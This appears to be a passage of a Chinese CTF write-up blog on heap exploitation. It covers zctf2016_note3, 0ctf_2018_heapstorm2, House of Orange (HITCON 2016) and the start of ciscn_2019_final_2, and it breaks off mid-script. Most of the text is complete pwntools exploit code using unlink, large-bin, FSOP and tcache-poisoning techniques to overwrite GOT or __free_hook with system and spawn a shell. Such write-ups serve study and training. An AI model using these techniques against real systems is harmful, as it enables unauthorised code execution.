= <span class="number">0x602120</span></span><br><span class="line">fd = ptr<span class="number">-0x18</span></span><br><span class="line">bk = ptr<span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x61</span>,fd,bk,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># 1,0x20</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># padding,prev_size=0x20+0x80,PREV_IN_USE=0</span></span><br><span class="line">add(<span class="number">0</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="number">0xa0</span>,<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="zctf2016-note3"><a href="#zctf2016-note3" class="headerlink" title="zctf2016_note3"></a>zctf2016_note3</h2><p>这题和上题类似，不过bss结构大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">current_ptr</span><br><span class="line">note0_ptr</span><br><span class="line">note1_ptr</span><br><span class="line">note2_ptr</span><br><span class="line">note3_ptr</span><br><span class="line">note4_ptr</span><br><span class="line">note5_ptr</span><br><span class="line">note6_ptr</span><br><span class="line">note7_ptr</span><br><span class="line">note0_size</span><br><span class="line">note1_size</span><br><span class="line">note2_size</span><br><span class="line">note3_size</span><br><span class="line">note4_size</span><br><span class="line">note5_size</span><br><span class="line">note6_size</span><br><span class="line">note7_size</span><br></pre></td></tr></table></figure>

<p>本题漏洞在于<code>edit</code>时会判断输入的长度是否小于0，如果是就取相反数。但是可以通过整数溢出，输入<code>0x8000000000000000</code>，它的相反数恰好是它自身，并且依然是一个负数（-1）。这样就造成数组越界，可以覆盖到<code>current_ptr</code>。</p>
<p>我们的思路是先让<code>current_ptr</code>指向<code>note3</code>，然后利用越界覆盖一个<code>fake_chunk</code>到<code>note3</code>上，再释放<code>note4</code>触发unlink，此时<code>note3_ptr</code>指向<code>note0_ptr</code>，这样就可以实现GOT劫持。</p>
<p>但是本题的<code>show</code>功能被禁用，而我们还需要泄露libc地址。这里用的方法是在bss段空余处写入<code>%llx.</code>，然后把<code>free</code>先劫持到<code>printf</code>，去打印这一段格式化字符串，相当于手动造了一个格式化字符串漏洞。这样就可以泄露栈上内容，从而泄露位于栈上的<code>__libc_start_main_ret</code>地址（一般位于偏移量11处）。最后泄露libc得到<code>system</code>地址，覆盖<code>atoi</code>即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;1024)&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">negative = <span class="number">0x8000000000000000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fd = <span class="number">0x6020c8</span>+<span class="number">0x8</span>*<span class="number">3</span><span class="number">-0x18</span></span><br><span class="line">bk = <span class="number">0x6020c8</span>+<span class="number">0x8</span>*<span class="number">3</span><span class="number">-0x10</span></span><br><span class="line">fake_chunk = flat(<span class="number">0</span>,<span class="number">0x201</span>,fd,bk).ljust(<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fake_chunk += flat(<span class="number">0x200</span>,<span class="number">0x210</span>)</span><br><span class="line">edit(-negative,fake_chunk)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">bss_blank = <span class="number">0x602100</span></span><br><span class="line">edit(<span class="number">3</span>,p64(bss_blank))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;%llx.&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">lsmr = <span class="built_in">int</span>(ru(<span class="string">&#x27;success&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">system,binsh = ret2libc(lsmr,<span class="string">&#x27;__libc_start_main_ret&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="0ctf-2018-heapstorm2"><a href="#0ctf-2018-heapstorm2" class="headerlink" title="0ctf_2018_heapstorm2"></a>0ctf_2018_heapstorm2</h2><p>分析先咕了，等完全理解了再补充。先放一些参考的wp：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://eternalsakura13.com/2018/04/03/heapstorm2/">wp1</a></li>
<li><a target="_blank" rel="noopener" href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/">wp2</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md">wp3</a></li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%d&#x27;</span> % size)</span><br><span class="line">    ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    m = ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    pos1 = m.find(<span class="string">&#x27;]: &#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">    pos2 = m.find(<span class="string">&#x27;\n1. &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> m[pos1:pos2]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">1</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x4f0</span>,<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">4</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x4f0</span>,<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span><span class="number">-12</span>))</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment"># 7</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span><span class="number">-12</span>))</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment"># 8</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">storage = <span class="number">0x13370800</span></span><br><span class="line">fake = storage<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4f1</span>,<span class="number">0</span>,fake)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4e1</span>,<span class="number">0</span>,fake+<span class="number">8</span>,<span class="number">0</span>,fake<span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	add(<span class="number">0x48</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	print(<span class="string">&#x27;Try again?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x13377331</span>,storage)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x13377331</span>,storage,<span class="number">0x1000</span>)</span><br><span class="line">p1 = payload + flat(storage<span class="number">-0x20</span>+<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p1)</span><br><span class="line"></span><br><span class="line">heap = uu64(show(<span class="number">1</span>))</span><br><span class="line">p2 = payload + flat(heap+<span class="number">0x10</span>,<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p2)</span><br><span class="line"></span><br><span class="line">base = uu64(show(<span class="number">1</span>))<span class="number">-88</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p3 = payload + flat(free_hook,<span class="number">0x100</span>,storage+<span class="number">0x50</span>,<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p3)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE*)0x555b7d04b4f0</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  _flags &#x3D; 1852400175,</span><br><span class="line">  _IO_read_ptr &#x3D; 0x61 &lt;error: Cannot access memory at address 0x61&gt;,</span><br><span class="line">  _IO_read_end &#x3D; 0x0,</span><br><span class="line">  _IO_read_base &#x3D; 0x7f29a0f30510 &quot;&quot;,</span><br><span class="line">  _IO_write_base &#x3D; 0x2 &lt;error: Cannot access memory at address 0x2&gt;,</span><br><span class="line">  _IO_write_ptr &#x3D; 0x3 &lt;error: Cannot access memory at address 0x3&gt;,</span><br><span class="line">  _IO_write_end &#x3D; 0x0,</span><br><span class="line">  _IO_buf_base &#x3D; 0x0,</span><br><span class="line">  _IO_buf_end &#x3D; 0x0,</span><br><span class="line">  _IO_save_base &#x3D; 0x0,</span><br><span class="line">  _IO_backup_base &#x3D; 0x0,</span><br><span class="line">  _IO_save_end &#x3D; 0x0,</span><br><span class="line">  _markers &#x3D; 0x0,</span><br><span class="line">  _chain &#x3D; 0x0,</span><br><span class="line">  _fileno &#x3D; 0,</span><br><span class="line">  _flags2 &#x3D; 0,</span><br><span class="line">  _old_offset &#x3D; 0,</span><br><span class="line">  _cur_column &#x3D; 0,</span><br><span class="line">  _vtable_offset &#x3D; 0 &#39;\000&#39;,</span><br><span class="line">  _shortbuf &#x3D; &quot;&quot;,</span><br><span class="line">  _lock &#x3D; 0x0,</span><br><span class="line">  _offset &#x3D; 0,</span><br><span class="line">  _codecvt &#x3D; 0x0,</span><br><span class="line">  _wide_data &#x3D; 0x0,</span><br><span class="line">  _freeres_list &#x3D; 0x0,</span><br><span class="line">  _freeres_buf &#x3D; 0x0,</span><br><span class="line">  __pad5 &#x3D; 0,</span><br><span class="line">  _mode &#x3D; 0,</span><br><span class="line">  _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,name</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;:&#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">useless = flat(<span class="number">0</span>,<span class="number">0x21</span>,<span class="number">0x1f00000001</span>,<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + useless + flat(<span class="number">0</span>,<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="number">0x40</span>,payload) <span class="comment"># corrupt top chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>) <span class="comment"># old_top -&gt; unsorted</span></span><br><span class="line">add(<span class="number">0x400</span>) <span class="comment"># slice old top</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">base = uu64(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-1640</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io_list_all = base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;large chunk:</span></span><br><span class="line"><span class="string">0x56512e53b0c0:	0x0000000000000000 0x0000000000000411</span></span><br><span class="line"><span class="string">0x56512e53b0d0:	0x6161616161616161	0x00007f01ea979188</span></span><br><span class="line"><span class="string">0x56512e53b0e0:	0x000056512e53b0c0	0x000056512e53b0c0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = uu64(ru(<span class="string">&#x27;\n&#x27;</span>)) - <span class="number">0xc0</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># jump_table+0x18</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,system).ljust(<span class="number">0x400</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable</span></span><br><span class="line">payload += useless + flat(<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x61</span>,<span class="number">0</span>,io_list_all<span class="number">-0x10</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span><span class="number">-0x30</span>),heap+<span class="number">0xd0</span>)</span><br><span class="line">edit(<span class="number">0x1000</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a>ciscn_2019_final_2</h2><p>本题需要将读入的<code>flag</code>的<code>fd</code>改为666。</p>
<p>存在tcache double free漏洞，首先分配多个<code>short</code>，利用double free泄露堆地址。然后tcache投毒，伪造<code>chunk0</code>大小，并释放进入unsorted bin泄露libc。注意释放前先填满tcache才能进入unsorted bin。</p>
<p>接下来继续投毒使<code>int</code>的<code>fd</code>指向<code>fileno</code>，再次double free泄露<code>chunk0</code>的<code>mem</code>指针地址。最后投毒指向<code>chunk0</code>的<code>mem</code>指针地址，再申请三次就可以修改<code>fileno</code>了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment"># total size: 0x90</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment"># prevent merging</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&#x27;number :&#x27;</span>)</span><br><span class="line">chunk0 = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-0xa0</span></span><br><span class="line">leak(<span class="string">&#x27;chunk0&#x27;</span>,chunk0)</span><br><span class="line">add(<span class="number">2</span>,chunk0) <span class="comment"># poisoning</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">add(<span 